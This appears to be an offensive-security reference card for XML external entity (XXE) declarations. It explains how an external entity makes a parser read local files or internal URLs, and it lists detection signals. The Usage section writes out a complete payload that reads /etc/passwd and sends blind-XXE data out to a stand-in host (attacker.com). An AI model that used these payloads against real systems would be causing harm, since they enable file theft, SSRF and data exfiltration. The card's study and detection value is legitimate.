---
type: code
language: xml
verified: true
platforms:
  - web
tags:
  - xxe
  - xml
  - external-entity
validated: true
---

# xml-external-entity-definition

## Code

```xml
<!ENTITY entity_name SYSTEM "entity_value">
```

## Description

Declares an external parsed entity in XML DTD using the SYSTEM keyword, referencing an external resource (URI). In XXE attacks, this forces the parser to fetch and include the resource, enabling local file reads (file:///) or SSRF (http://internal).

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| entity_name | Name to reference the entity (e.g., filedata) | filedata |
| entity_value | URI of the external resource (e.g., file:///etc/passwd for file read) | file:///etc/passwd |

## Usage

Place in DOCTYPE: <!DOCTYPE root [<!ENTITY filedata SYSTEM "file:///etc/passwd">]><root>&filedata;</root>. Send via POST to vulnerable endpoint. For blind XXE, use http://attacker.com/exfil?data= to OOB retrieve data.

## Detection

- Server logs for file access attempts (e.g., /etc/passwd reads).
- Outbound connections to unexpected URIs (SSRF).
- Parser errors on invalid entities.
- Network monitoring for file:// or internal IP requests.

## Related

- [[procedures/Perform-XML-External-Entity-XXE-Attack]]
- [[commands/curl-send-xxe-payload]]
